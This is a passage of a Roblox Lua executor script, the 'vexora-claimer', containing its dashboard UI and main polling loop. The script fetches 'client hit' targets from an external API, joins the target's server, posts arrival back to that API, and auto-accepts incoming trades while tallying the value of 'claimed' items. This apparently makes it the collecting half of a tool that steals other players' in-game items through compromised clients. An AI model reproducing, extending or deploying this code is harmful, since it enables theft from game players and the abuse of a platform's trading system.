        TextColor3 = dim, Text = "rev " .. CLAIMER_REV .. "  ·  " .. ME,
    }, header)

    local statusPill = new("Frame", {
        Size = UDim2.fromOffset(96, 22), Position = UDim2.new(1, -134, 0, 12),
        BackgroundColor3 = panel2, BorderSizePixel = 0,
    }, header)
    round(statusPill, 11)
    outline(statusPill, Color3.fromRGB(60, 60, 84), 0.35)
    local dot = new("Frame", {
        Size = UDim2.fromOffset(7, 7), Position = UDim2.fromOffset(9, 7),
        BackgroundColor3 = gold, BorderSizePixel = 0,
    }, statusPill)
    round(dot, 4)
    local statusText = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(21, 3), Size = UDim2.new(1, -25, 0, 16),
        Font = Enum.Font.GothamBold, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = ink, Text = "starting",
    }, statusPill)

    local close = new("TextButton", {
        Size = UDim2.fromOffset(26, 26), Position = UDim2.new(1, -33, 0, 10),
        BackgroundColor3 = Color3.fromRGB(45, 45, 62), Text = "x", TextSize = 13,
        Font = Enum.Font.GothamBold, TextColor3 = ink, AutoButtonColor = false,
    }, header)
    round(close, 8)

    local content = new("Frame", {
        Position = UDim2.fromOffset(0, 50), Size = UDim2.new(1, 0, 1, -50), BackgroundTransparency = 1,
    }, frame)

    local targetCard = new("Frame", {
        Position = UDim2.fromOffset(12, 0), Size = UDim2.new(1, -24, 0, 74),
        BackgroundColor3 = panel2, BorderSizePixel = 0,
    }, content)
    round(targetCard, 10)
    outline(targetCard, Color3.fromRGB(54, 54, 74), 0.4)
    new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(11, 7), Size = UDim2.new(1, -22, 0, 12),
        Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = accent, Text = "TARGET",
    }, targetCard)
    local targetTitle = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(11, 20), Size = UDim2.new(1, -22, 0, 22),
        Font = Enum.Font.GothamBold, TextSize = 15, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = ink, Text = "No target yet", TextTruncate = Enum.TextTruncate.AtEnd,
    }, targetCard)
    local targetSub = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(11, 45), Size = UDim2.new(1, -22, 0, 20),
        Font = Enum.Font.Code, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = dim, Text = "waiting for a client hit", TextTruncate = Enum.TextTruncate.AtEnd,
    }, targetCard)

    local function statCard(x, title)
        local card = new("Frame", {
            Position = UDim2.fromOffset(x, 82), Size = UDim2.fromOffset(102, 48),
            BackgroundColor3 = panel2, BorderSizePixel = 0,
        }, content)
        round(card, 9)
        outline(card, Color3.fromRGB(52, 52, 72), 0.45)
        local value = new("TextLabel", {
            BackgroundTransparency = 1, Position = UDim2.fromOffset(10, 7), Size = UDim2.new(1, -20, 0, 21),
            Font = Enum.Font.GothamBold, TextSize = 17, TextXAlignment = Enum.TextXAlignment.Left,
            TextColor3 = ink, Text = "0",
        }, card)
        new("TextLabel", {
            BackgroundTransparency = 1, Position = UDim2.fromOffset(10, 29), Size = UDim2.new(1, -20, 0, 12),
            Font = Enum.Font.GothamBold, TextSize = 8, TextXAlignment = Enum.TextXAlignment.Left,
            TextColor3 = dim, Text = title,
        }, card)
        return value
    end
    local queueStat = statCard(12, "QUEUE")
    local claimStat = statCard(122, "CLAIMED")
    local valueStat = statCard(232, "VALUE")

    new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(12, 140), Size = UDim2.fromOffset(100, 14),
        Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = dim, Text = "CLAIMED",
    }, content)
    local claimedBadge = new("TextLabel", {
        BackgroundColor3 = Color3.fromRGB(44, 36, 70), Position = UDim2.new(1, -52, 0, 139),
        Size = UDim2.fromOffset(40, 16), Font = Enum.Font.GothamBold, TextSize = 9,
        TextColor3 = ink, Text = "0", BackgroundTransparency = 0,
    }, content)
    round(claimedBadge, 8)

    local claimRows = {}
    for index = 1, 5 do
        local row = new("Frame", {
            Position = UDim2.fromOffset(12, 158 + (index - 1) * 17), Size = UDim2.new(1, -24, 0, 16),
            BackgroundTransparency = 1,
        }, content)
        local name = new("TextLabel", {
            BackgroundTransparency = 1, Position = UDim2.fromOffset(0, 0), Size = UDim2.new(1, -75, 0, 16),
            Font = Enum.Font.Gotham, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
            TextColor3 = ink, Text = "", TextTruncate = Enum.TextTruncate.AtEnd,
        }, row)
        local value = new("TextLabel", {
            BackgroundTransparency = 1, Position = UDim2.new(1, -70, 0, 0), Size = UDim2.fromOffset(70, 16),
            Font = Enum.Font.Code, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Right,
            TextColor3 = green, Text = "",
        }, row)
        table.insert(claimRows, { name = name, value = value })
    end
    local emptyClaim = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(12, 158), Size = UDim2.new(1, -24, 0, 16),
        Font = Enum.Font.Gotham, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = dim, Text = "No claims yet — trades will show up here",
    }, content)

    local function toggleRow(textValue, y, isOn, onChange)
        local row = new("Frame", {
            Position = UDim2.fromOffset(12, y), Size = UDim2.new(1, -24, 0, 28),
            BackgroundColor3 = panel2, BorderSizePixel = 0,
        }, content)
        round(row, 9)
        outline(row, Color3.fromRGB(50, 50, 70), 0.55)
        new("TextLabel", {
            BackgroundTransparency = 1, Position = UDim2.fromOffset(11, 5),
            Size = UDim2.new(1, -70, 0, 18), Font = Enum.Font.Gotham, TextSize = 11,
            TextXAlignment = Enum.TextXAlignment.Left, TextColor3 = ink, Text = textValue,
        }, row)
        local pill = new("TextButton", {
            Position = UDim2.new(1, -57, 0, 5), Size = UDim2.fromOffset(46, 18),
            BackgroundColor3 = isOn and green or red, Text = isOn and "ON" or "OFF",
            TextSize = 9, Font = Enum.Font.GothamBold, TextColor3 = Color3.new(1, 1, 1),
            AutoButtonColor = false,
        }, row)
        round(pill, 7)
        pill.MouseButton1Click:Connect(function()
            isOn = not isOn
            pill.Text = isOn and "ON" or "OFF"
            pill.BackgroundColor3 = isOn and green or red
            onChange(isOn)
        end)
    end

    toggleRow("Auto claimer", 254, settings.enabled, function(value)
        settings.enabled = value
        ui.state = value and "polling" or "off"
        setDashboardArmed(value)
        if uiApi.update then uiApi.update() end
    end)
    toggleRow("Auto execute on load", 286, settings.autoExecute, function(value)
        settings.autoExecute = value
    end)
    toggleRow("Auto accept trades", 318, settings.autoAccept, function(value)
        settings.autoAccept = value
        AUTO_ACCEPT = value
    end)

    local poll = new("TextButton", {
        Position = UDim2.fromOffset(12, 356), Size = UDim2.fromOffset(150, 32),
        BackgroundColor3 = accent, Text = "Poll dashboard now", TextSize = 11,
        Font = Enum.Font.GothamBold, TextColor3 = Color3.new(1, 1, 1), AutoButtonColor = false,
    }, content)
    round(poll, 9)
    gradient(poll, accent, cyan, 25)
    poll.MouseButton1Click:Connect(function()
        task.spawn(function()
            getTarget()
            if uiApi.update then uiApi.update() end
        end)
    end)

    local copy = new("TextButton", {
        Position = UDim2.fromOffset(170, 356), Size = UDim2.fromOffset(166, 32),
        BackgroundColor3 = panel2, Text = "Copy join link", TextSize = 11,
        Font = Enum.Font.GothamBold, TextColor3 = ink, AutoButtonColor = false,
    }, content)
    round(copy, 9)
    outline(copy, Color3.fromRGB(60, 60, 84), 0.35)
    copy.MouseButton1Click:Connect(function()
        local link = ui.joinLink or (ui.target and joinUrl(ui.target, true))
        if not link then
            ui.joinNotice = "no target yet"
        else
            local ok = copyText(link)
            ui.joinNotice = ok and "join link copied" or "clipboard unavailable — see console"
            if not ok then print("[vexora-claimer] join link: " .. link) end
        end
        if uiApi.update then uiApi.update() end
    end)

    local footer = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(12, 404), Size = UDim2.new(1, -24, 0, 16),
        Font = Enum.Font.Code, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = dim, Text = "api " .. API_BASE, TextTruncate = Enum.TextTruncate.AtEnd,
    }, content)

    local function setOpen(open)
        frame.Visible = open
        float.Visible = not open
    end
    close.MouseButton1Click:Connect(function() setOpen(false) end)
    float.MouseButton1Click:Connect(function() setOpen(true) end)

    local dragging, dragStart, startPos = false, nil, nil
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    uiApi.update = function()
        if not frame.Parent then return end
        local state = tostring(ui.state or "starting")
        statusText.Text = state:sub(1, 13)
        local color = green
        if state == "failed" or state == "offline" or state == "off" then
            color = red
        elseif state == "joining" or state == "handoff" or state == "paused" then
            color = gold
        end
        dot.BackgroundColor3 = color
        statusText.TextColor3 = color

        local target = ui.target
        targetTitle.Text = target and tostring(target.item or "?") or "No target yet"
        local errorText = ui.error or ui.joinError
        if errorText then
            targetSub.Text = tostring(errorText)
            targetSub.TextColor3 = red
        elseif target then
            targetSub.Text = string.format("%s  ·  %s  ·  %s",
                moneyText(target.value), tostring(target.server_id or ""):sub(1, 10), tostring(GAME))
            targetSub.TextColor3 = dim
        else
            targetSub.Text = "waiting for a client hit"
            targetSub.TextColor3 = dim
        end

        queueStat.Text = tostring(ui.queue or 0)
        claimStat.Text = tostring(ui.claimCount or #ui.claimed)
        valueStat.Text = moneyText(ui.claimValue)
        claimedBadge.Text = tostring(ui.claimCount or #ui.claimed)

        for index, row in ipairs(claimRows) do
            local entry = ui.claimed[index]
            row.name.Text = entry and tostring(entry.item) or ""
            row.value.Text = entry and ((tonumber(entry.value) or 0) > 0 and moneyText(entry.value) or "—") or ""
            row.name.Visible = entry ~= nil
            row.value.Visible = entry ~= nil
        end
        emptyClaim.Visible = #ui.claimed == 0
        footer.Text = ui.joinNotice or ("api " .. API_BASE)
    end

    setOpen(true)
end

local uiOk, uiErr = pcall(buildUi)
if not uiOk then print("[vexora-claimer] ui error: " .. tostring(uiErr)) end

print(string.format("[vexora-claimer] rev %s | %s | game=%s | server=%s | api=%s",
    CLAIMER_REV, ME, GAME, tostring(HERE), API_BASE))
print(string.format("[vexora-claimer] trading=%s poll=%ds stay=%ds remotes=%d/%d",
    tostring(trading), POLL_SECONDS, STAY_SECONDS, #tradeRemotes, #acceptRemotes))
heartbeat("starting")
-- executing the claimer with auto execute on should arm the dashboard too, not
-- leave a second switch to find on another device.
setDashboardArmed(settings.enabled)
if uiApi.update then pcall(uiApi.update) end
task.spawn(function()
    loadClaimed()
    if uiApi.update then pcall(uiApi.update) end
end)

task.spawn(function()
    while running do
        local payload = nil
        if settings.enabled and os.time() >= nextJoinAt then
            payload = getTarget()
        elseif settings.enabled then
            ui.state = "waiting"
            heartbeat("waiting", nil, ui.joinError)
        end
        if not settings.enabled then ui.state = "off" end
        if payload then
            if payload.paused then
                -- claimer is disarmed on the dashboard
            elseif payload.target then
                local target = payload.target
                if target.server_id == HERE then
                    startTrading(target)
                    if arrivedFor ~= target.id then
                        arrivedFor = target.id
                        pcall(function()
                            http("POST", API_BASE .. "/api/claimer/target/" .. encode(target.id) .. "/arrived",
                                { server_id = HERE, account = ME })
                        end)
                    end
                elseif not trading or (os.time() - arrivedAt) >= STAY_SECONDS then
                    local joined = joinTarget(target)
                    if joined then return end
                end
            end
        end
        if uiApi.update then pcall(uiApi.update) end
        task.wait(POLL_SECONDS)
    end
end)

return {
    rev = CLAIMER_REV,
    stop = stop,
    join = joinTarget,
    target = getTarget,
    ui = uiApi,
    settings = settings,
}
